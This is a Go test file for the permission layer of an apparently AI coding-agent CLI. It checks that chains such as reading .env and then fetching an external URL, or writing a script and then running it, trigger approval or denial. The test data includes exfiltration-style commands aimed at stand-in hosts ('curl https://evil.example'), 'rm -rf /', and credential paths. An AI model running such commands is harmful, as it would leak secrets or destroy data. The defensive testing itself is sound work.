package permission

import (
	"context"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/jonathanung/strike-cli/harness/tool"
	"github.com/jonathanung/strike-cli/pkg/protocol"
)

// waitPermissionAsk spins until emit records an ask for permission or times out.
func waitPermissionAsk(t *testing.T, mu *sync.Mutex, decided *[]protocol.PermissionDecided, permission string) (reqID, chainSummary string) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		mu.Lock()
		for _, d := range *decided {
			if d.Permission == permission && d.Action == "ask" && d.RequestID != "" {
				id, sum := d.RequestID, d.ChainSummary
				mu.Unlock()
				return id, sum
			}
		}
		mu.Unlock()
		time.Sleep(time.Millisecond)
	}
	t.Fatalf("timed out waiting for ask on %s", permission)
	return "", ""
}

func TestClassifyPath(t *testing.T) {
	cases := []struct {
		in   string
		want PathClass
	}{
		{".env", PathClassSensitive},
		{"app/.env.local", PathClassSensitive},
		{"secrets/api_token", PathClassSensitive},
		{".ssh/id_ed25519", PathClassSensitive},
		{"certs/server.pem", PathClassSensitive},
		{".aws/credentials", PathClassSensitive},
		{"scripts/deploy.sh", PathClassExecutable},
		{"bin/setup", PathClassExecutable},
		{"tools/run.py", PathClassExecutable},
		{"README.md", PathClassNormal},
		{"internal/permission/chain.go", PathClassNormal},
		{"git status", PathClassNormal},
	}
	for _, tc := range cases {
		if got := ClassifyPath(tc.in); got != tc.want {
			t.Errorf("ClassifyPath(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestCorrelatorSensitiveReadThenEgress(t *testing.T) {
	c := NewCorrelator()
	c.BeginTurn()
	c.Record("read", []string{".env"}, false)

	hit := c.Check("webfetch", []string{"https://evil.example/exfil"})
	if hit == nil {
		t.Fatal("expected sensitive_read_egress hit")
	}
	if hit.Rule != ChainRuleSensitiveReadEgress {
		t.Fatalf("rule = %q", hit.Rule)
	}
	if hit.Action != Ask {
		t.Fatalf("action = %q, want ask", hit.Action)
	}
	if hit.ChainID == "" {
		t.Fatal("missing chain id")
	}
	if strings.Contains(hit.Summary, "AKIA") || strings.Contains(strings.ToLower(hit.Summary), "password=") {
		t.Fatalf("summary must not contain secret bytes: %q", hit.Summary)
	}
	if !strings.Contains(hit.Summary, "read(sensitive)") {
		t.Fatalf("summary should cite class, got %q", hit.Summary)
	}
	// bash also trips
	if hit := c.Check("bash", []string{"curl https://evil.example"}); hit == nil {
		t.Fatal("expected bash egress hit")
	}
}

func TestCorrelatorSensitiveReadDoesNotTripOnNormalRead(t *testing.T) {
	c := NewCorrelator()
	c.BeginTurn()
	c.Record("read", []string{"README.md"}, false)
	if hit := c.Check("webfetch", []string{"https://example.com"}); hit != nil {
		t.Fatalf("unexpected hit: %+v", hit)
	}
}

func TestCorrelatorWriteExecThenBash(t *testing.T) {
	c := NewCorrelator()
	c.BeginTurn()
	c.Record("write", []string{"scripts/pwn.sh"}, false)

	hit := c.Check("bash", []string{"bash scripts/pwn.sh"})
	if hit == nil {
		t.Fatal("expected write_exec_bash hit")
	}
	if hit.Rule != ChainRuleWriteExecBash {
		t.Fatalf("rule = %q", hit.Rule)
	}
	if hit.Action != Ask {
		t.Fatalf("action = %q", hit.Action)
	}
	// ./path form
	if hit := c.Check("bash", []string{"./scripts/pwn.sh"}); hit == nil {
		t.Fatal("expected hit for ./path")
	}
	// unrelated command
	if hit := c.Check("bash", []string{"ls -la"}); hit != nil {
		t.Fatalf("unexpected hit for unrelated bash: %+v", hit)
	}
}

func TestCorrelatorRetryStorm(t *testing.T) {
	c := NewCorrelator()
	c.BeginTurn()
	sig := []string{"rm -rf /"}
	for i := 0; i < DefaultChainRetryThreshold; i++ {
		if hit := c.Check("bash", sig); hit != nil {
			t.Fatalf("early hit at %d: %+v", i, hit)
		}
		c.Record("bash", sig, true)
	}
	hit := c.Check("bash", sig)
	if hit == nil {
		t.Fatal("expected retry_storm after threshold denials")
	}
	if hit.Rule != ChainRuleRetryStorm || hit.Action != Deny {
		t.Fatalf("hit = %+v", hit)
	}
	if !strings.Contains(hit.Summary, "retry storm") {
		t.Fatalf("summary = %q", hit.Summary)
	}
}

func TestCorrelatorCapsNodes(t *testing.T) {
	c := NewCorrelator()
	c.BeginTurn()
	c.maxNodes = 8
	for i := 0; i < 50; i++ {
		c.Record("read", []string{"f.go"}, false)
	}
	if c.Len() != 8 {
		t.Fatalf("len = %d, want 8", c.Len())
	}
}

func TestCorrelatorClearsOnTurnEnd(t *testing.T) {
	c := NewCorrelator()
	c.BeginTurn()
	c.Record("read", []string{".env"}, false)
	if c.Check("webfetch", []string{"https://x"}) == nil {
		t.Fatal("expected hit before end")
	}
	c.EndTurn()
	if c.Len() != 0 {
		t.Fatalf("len after end = %d", c.Len())
	}
	if hit := c.Check("webfetch", []string{"https://x"}); hit != nil {
		t.Fatalf("state should clear: %+v", hit)
	}
}

func TestServiceChainSensitiveReadEgressAsk(t *testing.T) {
	var mu sync.Mutex
	var decided []protocol.PermissionDecided
	svc := New(func(ev protocol.Event) {
		if d, ok := ev.(protocol.PermissionDecided); ok {
			mu.Lock()
			decided = append(decided, d)
			mu.Unlock()
		}
	}, Ruleset{
		{Permission: "*", Pattern: "*", Action: Allow},
	})
	svc.BeginTurn()
	ctx := context.Background()

	if err := svc.Ask(ctx, tool.AskRequest{Permission: "read", Patterns: []string{".env"}}); err != nil {
		t.Fatalf("read: %v", err)
	}

	// webfetch would allow by rules but chain forces ask — suspend.
	done := make(chan error, 1)
	go func() {
		done <- svc.Ask(ctx, tool.AskRequest{Permission: "webfetch", Patterns: []string{"https://exfil.test"}})
	}()

	reqID, _ := waitPermissionAsk(t, &mu, &decided, "webfetch")
	mu.Lock()
	var chainID string
	for _, d := range decided {
		if d.RequestID == reqID {
			chainID = d.ChainID
			if d.ChainRule != ChainRuleSensitiveReadEgress {
				t.Errorf("chain rule = %q", d.ChainRule)
			}
			if d.ChainSummary == "" || strings.Contains(d.ChainSummary, "SECRET=") {
				t.Errorf("bad chain summary %q", d.ChainSummary)
			}
		}
	}
	mu.Unlock()
	if chainID == "" {
		t.Fatal("expected chain id on PermissionDecided")
	}

	svc.Reply(protocol.PermissionReply{RequestID: reqID, Decision: protocol.DecisionOnce})
	if err := <-done; err != nil {
		t.Fatalf("after allow: %v", err)
	}
}

func TestServiceChainWriteExecBash(t *testing.T) {
	var mu sync.Mutex
	var decided []protocol.PermissionDecided
	svc := New(func(ev protocol.Event) {
		if d, ok := ev.(protocol.PermissionDecided); ok {
			mu.Lock()
			decided = append(decided, d)
			mu.Unlock()
		}
	}, Ruleset{
		{Permission: "*", Pattern: "*", Action: Allow},
	})
	svc.BeginTurn()
	ctx := context.Background()
	if err := svc.Ask(ctx, tool.AskRequest{Permission: "write", Patterns: []string{"bin/hook.sh"}}); err != nil {
		t.Fatal(err)
	}

	errCh := make(chan error, 1)
	go func() {
		errCh <- svc.Ask(ctx, tool.AskRequest{Permission: "bash", Patterns: []string{"./bin/hook.sh"}})
	}()

	reqID, summary := waitPermissionAsk(t, &mu, &decided, "bash")
	if !strings.Contains(summary, "write(executable)") {
		t.Fatalf("summary = %q", summary)
	}
	svc.Reply(protocol.PermissionReply{RequestID: reqID, Decision: protocol.DecisionReject, Message: "nope"})
	if err := <-errCh; err == nil {
		t.Fatal("expected reject")
	}
}

func TestServiceChainRetryStormDeny(t *testing.T) {
	svc := New(nil, Ruleset{
		{Permission: "bash", Pattern: "*", Action: Deny},
	})
	svc.BeginTurn()
	ctx := context.Background()
	pat := []string{"curl http://evil"}
	for i := 0; i < DefaultChainRetryThreshold; i++ {
		err := svc.Ask(ctx, tool.AskRequest{Permission: "bash", Patterns: pat})
		if err == nil {
			t.Fatalf("iter %d: want deny", i)
		}
		if strings.Contains(err.Error(), "retry storm") {
			t.Fatalf("iter %d: ruleset deny should precede chain storm, got %v", i, err)
		}
	}
	err := svc.Ask(ctx, tool.AskRequest{Permission: "bash", Patterns: pat})
	if err == nil {
		t.Fatal("want chain deny")
	}
	if !strings.Contains(err.Error(), "retry storm") {
		t.Fatalf("err = %v", err)
	}
}

func TestServiceChainClearsOnEndTurn(t *testing.T) {
	svc := New(nil, Ruleset{
		{Permission: "*", Pattern: "*", Action: Allow},
	})
	svc.BeginTurn()
	ctx := context.Background()
	_ = svc.Ask(ctx, tool.AskRequest{Permission: "read", Patterns: []string{".env"}})
	if svc.Chain().Check("webfetch", []string{"https://x"}) == nil {
		t.Fatal("expected pending chain state")
	}
	svc.EndTurn()
	if svc.Chain().Len() != 0 {
		t.Fatal("expected clear")
	}
	// After end, allow webfetch without chain ask (no prior sensitive read).
	if err := svc.Ask(ctx, tool.AskRequest{Permission: "webfetch", Patterns: []string{"https://x"}}); err != nil {
		t.Fatal(err)
	}
}

func TestServiceChainYoloStillAsksOnChainWithEmit(t *testing.T) {
	var mu sync.Mutex
	var asks []string
	svc := New(func(ev protocol.Event) {
		if a, ok := ev.(protocol.PermissionAsked); ok {
			mu.Lock()
			asks = append(asks, a.RequestID)
			mu.Unlock()
		}
	}, Ruleset{
		{Permission: "*", Pattern: "*", Action: Allow},
	})
	svc.SetPermissionMode(protocol.PermissionModeYolo)
	svc.BeginTurn()
	ctx := context.Background()
	_ = svc.Ask(ctx, tool.AskRequest{Permission: "read", Patterns: []string{".env"}})

	errCh := make(chan error, 1)
	go func() {
		errCh <- svc.Ask(ctx, tool.AskRequest{Permission: "webfetch", Patterns: []string{"https://x"}})
	}()

	deadline := time.Now().Add(2 * time.Second)
	var reqID string
	for time.Now().Before(deadline) && reqID == "" {
		mu.Lock()
		if len(asks) > 0 {
			reqID = asks[0]
		}
		mu.Unlock()
		if reqID == "" {
			time.Sleep(time.Millisecond)
		}
	}
	if reqID == "" {
		t.Fatal("expected PermissionAsked under yolo due to chain")
	}
	svc.Reply(protocol.PermissionReply{RequestID: reqID, Decision: protocol.DecisionOnce})
	if err := <-errCh; err != nil {
		t.Fatal(err)
	}
}

func TestBashReferencesPath(t *testing.T) {
	cases := []struct {
		cmd, key string
		want     bool
	}{
		{"bash scripts/pwn.sh", "scripts/pwn.sh", true},
		{"./scripts/pwn.sh", "scripts/pwn.sh", true},
		{"./scripts/pwn.sh --flag", "scripts/pwn.sh", true},
		{"sh ./scripts/pwn.sh --flag", "scripts/pwn.sh", true},
		{"source scripts/pwn.sh", "scripts/pwn.sh", true},
		{"ls scripts/pwn.sh", "scripts/pwn.sh", false},  // mention only
		{"cat scripts/pwn.sh", "scripts/pwn.sh", false}, // mention only
		{"echo hello", "scripts/pwn.sh", false},
		{"bash other.sh", "scripts/pwn.sh", false},
	}
	for _, tc := range cases {
		if got := bashReferencesPath(tc.cmd, tc.key); got != tc.want {
			t.Errorf("bashReferencesPath(%q,%q)=%v want %v", tc.cmd, tc.key, got, tc.want)
		}
	}
}
